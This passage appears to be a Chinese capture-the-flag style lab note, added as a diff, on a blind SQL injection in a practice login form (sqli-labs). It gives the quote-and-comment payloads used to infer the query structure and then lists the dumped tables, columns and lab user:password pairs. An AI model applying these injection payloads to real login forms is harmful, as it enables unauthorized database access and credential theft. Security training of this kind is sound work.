@@ -1,0 +1,25 @@
+uname=admin&passwd=admin&submit=Submit
+显示flag.jpg
+uname='admin&passwd=admin&submit=Submit
+显示slap.jpg
+说明正确和错误显示的图片不同，如果错误的话，不会把错误详情打印出来
+
+推测sql：
+推测1：select 字段名 from 表名 where uname = '' and passwd = '';
+uname=admin'-- &passwd=admin&submit=Submit显示slap.jpg，推测不正确
+推测2：select 字段名 from 表名 where uname = "" and passwd = "";
+uname=admin"-- &passwd=admin&submit=Submit显示slap.jpg，推测不正确
+推测3：select 字段名 from 表名 where uname = ('') and passwd = ('');
+uname=admin')-- &passwd=admin&submit=Submit显示slap.jpg，推测不正确
+推测4：select 字段名 from 表名 where uname = ("") and passwd = ("");
+uname=admin")-- &passwd=admin&submit=Submit显示flag.jpg，推测正确（如果推测再不正确，就加括号试试）
+sql：select 字段名 from 表名 where uname = ("") and passwd = ("");
+
+脚本与Less-15相似
+表名：
+result: users,uagents,emails,referers
+字段名：
+result: id,username,password,user,current_connections,total_connections
+字段值：
+result: dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
+
